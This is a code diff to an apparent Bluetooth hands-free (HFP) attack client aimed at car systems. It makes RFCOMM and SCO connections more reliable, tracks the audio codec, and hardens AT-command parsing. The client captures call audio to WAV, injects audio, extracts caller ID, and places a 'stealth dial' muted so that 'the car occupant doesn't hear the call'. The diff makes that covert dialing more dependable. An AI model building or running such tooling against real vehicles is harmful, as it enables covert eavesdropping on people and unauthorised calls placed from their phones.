@@ -68,24 +68,39 @@ class HFPClient:
         self.indicators = {}
         self.indicator_values = {}
         self.slc_established = False
+        self.audio_rate = 8000  # Default CVSD; updated to 16000 if mSBC negotiated
+        self.audio_codec = "CVSD"
 
     def connect(self) -> bool:
         """Connect RFCOMM to HFP Audio Gateway."""
-        try:
-            self.rfcomm_sock = socket.socket(
-                socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM
-            )
-            if self.channel is None:
-                error("No RFCOMM channel specified. Use SDP to discover the HFP channel.")
-                return False
-            info(f"Connecting HFP to {self.address} channel {self.channel}...")
-            self.rfcomm_sock.connect((self.address, self.channel))
-            self.rfcomm_sock.settimeout(5.0)
-            success("HFP RFCOMM connected")
-            return True
-        except OSError as e:
-            error(f"HFP connect failed: {e}")
+        if self.channel is None:
+            error("No RFCOMM channel specified. Use SDP to discover the HFP channel.")
             return False
+        info(f"Connecting HFP to {self.address} channel {self.channel}...")
+        for attempt in range(2):
+            try:
+                self.rfcomm_sock = socket.socket(
+                    socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM
+                )
+                self.rfcomm_sock.settimeout(5.0)
+                self.rfcomm_sock.connect((self.address, self.channel))
+                success(f"HFP RFCOMM connected to {self.address} channel {self.channel}")
+                return True
+            except OSError as e:
+                # Close failed socket before retry to prevent leak
+                if self.rfcomm_sock:
+                    try:
+                        self.rfcomm_sock.close()
+                    except OSError:
+                        pass
+                    self.rfcomm_sock = None
+                if attempt == 0:
+                    warning(f"RFCOMM connection failed ({e}), retrying in 2s...")
+                    time.sleep(2)
+                    continue
+                error(f"RFCOMM connection failed after retry: {e}")
+                return False
+        return False
 
     def disconnect(self):
         """Disconnect HFP."""
@@ -114,10 +129,12 @@ class HFPClient:
         response = self._send_at(f"AT+BRSF={HFP_HF_FEATURES}")
         if "+BRSF:" in response:
             try:
-                self.ag_features = int(response.split(":")[1].strip().split("\r")[0])
+                brsf_str = response.split(":")[1].strip().split("\r")[0]
+                self.ag_features = int(brsf_str)
                 info(f"AG features: 0x{self.ag_features:04x}")
-            except (ValueError, IndexError):
-                pass
+            except (IndexError, ValueError):
+                warning(f"Could not parse AG features from BRSF response: {response[:80]}")
+                self.ag_features = 0
         elif not response or "ERROR" in response:
             error("SLC failed: feature exchange (AT+BRSF) rejected or no response")
             return False
@@ -155,19 +172,32 @@ class HFPClient:
         Audio format: 8000 Hz, 16-bit signed, mono (CVSD) or mSBC.
         """
         info("Setting up SCO audio link...")
-        try:
-            self.sco_sock = socket.socket(
-                socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_SCO
-            )
-            self.sco_sock.connect((self.address,))
-            self.sco_sock.settimeout(1.0)
-            success("SCO audio link established")
-            return True
-        except OSError as e:
-            error(f"SCO setup failed: {e}")
-            warning("SCO may require root and specific adapter support")
-            warning("Try: sudo btmgmt power off && sudo btmgmt sco-setup on && sudo btmgmt power on")
-            return False
+        for attempt in range(2):
+            try:
+                self.sco_sock = socket.socket(
+                    socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_SCO
+                )
+                self.sco_sock.connect((self.address,))
+                self.sco_sock.settimeout(1.0)
+                success("SCO audio link established")
+                return True
+            except OSError as e:
+                # Close failed socket before retry or final return
+                if self.sco_sock:
+                    try:
+                        self.sco_sock.close()
+                    except OSError:
+                        pass
+                    self.sco_sock = None
+                if attempt == 0:
+                    warning(f"SCO connection failed ({e}), retrying in 2s...")
+                    time.sleep(2)
+                    continue
+                error(f"SCO setup failed after retry: {e}")
+                warning("SCO may require root and specific adapter support")
+                warning("Try: sudo btmgmt power off && sudo btmgmt sco-setup on && sudo btmgmt power on")
+                return False
+        return False
 
     def capture_audio(self, output_file: str = "hfp_capture.wav",
                        duration: int = 60, sample_rate: int = 8000,
@@ -207,18 +237,20 @@ class HFPClient:
                 error(f"Audio capture error: {e}")
                 break
 
-        if frames:
-            audio_data = b"".join(frames)
-            with wave.open(output_file, "wb") as wf:
-                wf.setnchannels(1)
-                wf.setsampwidth(2)  # 16-bit
-                wf.setframerate(sample_rate)
-                wf.writeframes(audio_data)
-            success(f"Captured {len(audio_data)} bytes -> {output_file}")
-            return output_file
-        else:
-            warning("No audio frames captured")
+        if not frames:
+            warning("No audio frames captured via SCO")
             return ""
+
+        audio_data = b"".join(frames)
+        # Use instance audio_rate (set by codec negotiation) if available
+        effective_rate = getattr(self, "audio_rate", None) or sample_rate
+        with wave.open(output_file, "wb") as wf:
+            wf.setnchannels(1)
+            wf.setsampwidth(2)  # 16-bit
+            wf.setframerate(effective_rate)
+            wf.writeframes(audio_data)
+        success(f"Captured {len(audio_data)} bytes ({effective_rate}Hz) -> {output_file}")
+        return output_file
 
     def inject_audio(self, audio_file: str, sample_rate: int = 8000,
                       use_paplay: bool = False) -> bool:
@@ -382,9 +414,20 @@ class HFPClient:
 
         # AG may send +BCS asynchronously — check for it
         if "+BCS:" in response:
-            codec_id = response.split("+BCS:")[1].strip().split()[0]
-            info(f"AG selected codec: {'mSBC (16kHz)' if codec_id == '2' else 'CVSD (8kHz)'}")
+            try:
+                codec_id = response.split("+BCS:")[1].strip().split()[0]
+            except (IndexError, ValueError):
+                warning(f"Could not parse codec selection from response: {response[:80]}")
+                return False
             self._send_at(f"AT+BCS={codec_id}")
+            if codec_id == "2":
+                self.audio_rate = 16000
+                self.audio_codec = "mSBC"
+                info("Codec negotiated: mSBC (16kHz wideband)")
+            else:
+                self.audio_rate = 8000
+                self.audio_codec = "CVSD"
+                info("Codec negotiated: CVSD (8kHz narrowband)")
             return True
 
         info("Codec list sent — AG will select during next audio connection")
@@ -443,18 +486,20 @@ class HFPClient:
     def silent_call(self, number: str) -> bool:
         """Initiate a call with volume muted (stealth dial).
 
-        Dials the number then immediately mutes the speaker and mic
+        Dials the number then mutes the speaker and mic
         so the car occupant doesn't hear the call.
         """
         info(f"Silent call to {number}...")
-        result = self.dial(number)
-        if result and ("OK" in result or "ERROR" not in result):
-            # Immediately mute speaker and mic
-            self._send_at("AT+VGS=0")  # Speaker volume 0
-            self._send_at("AT+VGM=0")  # Mic volume 0
-            success("Call initiated with volume muted")
-            return True
-        return False
+        result = self._send_at(f"ATD{number};", timeout=30)
+        if "OK" not in result and "ERROR" in result:
+            error(f"Dial failed: {result}")
+            return False
+        # Wait for call setup before muting — immediate mute races with audio start
+        time.sleep(1.5)
+        self._send_at("AT+VGS=0")  # Speaker volume 0
+        self._send_at("AT+VGM=0")  # Mic volume 0
+        success("Call initiated with volume muted")
+        return True
 
     def wait_for_incoming(self, timeout: int = 300) -> dict | None:
         """Wait for an incoming call and extract caller ID.
@@ -532,8 +577,12 @@ class HFPClient:
                             break
                 except TimeoutError:
                     continue
+                except OSError:
+                    break  # Socket closed — return what we have
 
-            result = response.decode("utf-8", errors="replace").strip()
+            # Normalize line endings for cross-platform tolerance
+            result = response.decode("utf-8", errors="replace")
+            result = result.replace("\r\n", "\n").replace("\r", "\n").strip()
             if result:
                 info(f"AT> {command}")
                 for line in result.splitlines():
@@ -550,6 +599,9 @@ class HFPClient:
         """Parse +CIND=? response for indicator names."""
         # Match indicator names which may contain hyphens (e.g., "battery-level")
         indicators = re.findall(r'\("([\w-]+)"', response)
+        if not indicators:
+            warning(f"No indicators found in CIND mapping: {response[:80]}")
+            return
         for i, name in enumerate(indicators):
             self.indicators[name] = i
 
@@ -559,10 +611,17 @@ class HFPClient:
         Stores values in self.indicator_values (separate from the
         name-to-index mapping in self.indicators).
         """
-        values_str = response.split(":")[1].strip().split("\r")[0] if ":" in response else ""
+        try:
+            values_str = response.split(":")[1].strip().split("\r")[0]
+        except (IndexError, AttributeError):
+            warning(f"Could not parse indicator values: {response[:80]}")
+            return
         values = re.findall(r"(\d+)", values_str)
         self.indicator_values = {}
         indicator_names = list(self.indicators.keys())
         for i, val in enumerate(values):
             if i < len(indicator_names):
-                self.indicator_values[indicator_names[i]] = int(val)
+                try:
+                    self.indicator_values[indicator_names[i]] = int(val)
+                except ValueError:
+                    pass
